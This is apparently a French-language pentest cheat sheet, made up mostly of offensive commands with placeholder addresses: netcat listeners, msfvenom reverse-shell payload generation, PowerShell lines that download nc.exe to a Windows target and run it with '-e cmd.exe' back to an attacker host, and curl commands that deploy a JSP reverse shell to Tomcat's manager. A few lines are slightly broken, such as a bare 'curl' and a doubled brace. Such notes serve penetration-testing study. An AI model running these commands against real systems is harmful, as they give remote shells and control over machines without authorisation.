## Ecouter sur un port
```bash
$ nc -lvnp {port}
```

## Pour les reverses shell (en normal ou meterpreter)
Pentestmonkey propose des reverses shell en plusieurs langage :</br>
<a>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></br>
Sinon un reverse classique pour meterpreter (pour prendre la main sur msf) :
```bash
$ msfvenom -p {payload} lhost={local_ip_address} lport={local_port} -f {format} -o {nom}
```
&nbsp;exemple payload : linux/x86/meterpreter/reverse_tcp ou android/meterpreter/reverse_tcp
&nbsp;exemple format : raw / elf / war

## Transfert de fichier 
### Attaquant voulant partager nc.exe
Nous voulons partager nc.exe 
```bash
$ cd ~/Desktop/ # On va là où les fichiers que l'on veut partager sont.
$ python3 -m http.server {port_local}
```
De base le port est 8000 si on précise pas de port_local.
### Target récupérant le nc.exe
Sur un client Windows (le télécharger et exécuter) :
```bash 
powershell -c (New-Object Net.WebClient).DownloadFile('http://{adresse_ip}:{port_local}/nc.exe', 'nc.exe')
powershell.exe Start-Process .\nc.exe -ArgumentList '{LHOST} {LPORT} -e cmd.exe'
```
Sur un client Linux :
```bash
$ curl 
$ wget http://{adresse_ip}:{port_local}}/nc.exe
```
### Envoyer un fichier via Netcat
```bash
$ cat something.zip | netcat {ip_client} {port_client}
```
### Recevoir un fichier via Netcat
```bash
$ nc -l -p {port} -q 1 > something.zip < /dev/null
```

### Upload shell sur tomcat
```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > shell.war
$ curl -u 'username':'password' -T shell.war 'http://{target}/manager/text/deploy?path=/mon_shell'
$ curl -u 'username':'password' http://{target}/mon_shell/
```

## Penser aux CVE
### Recherche de vuln
```bash 
$ searchsploit {keyword}
$ searchsploit -w {keyword}
```

## Forward de port
Pour le forward de port remote, local et dynamique, voir le document word.
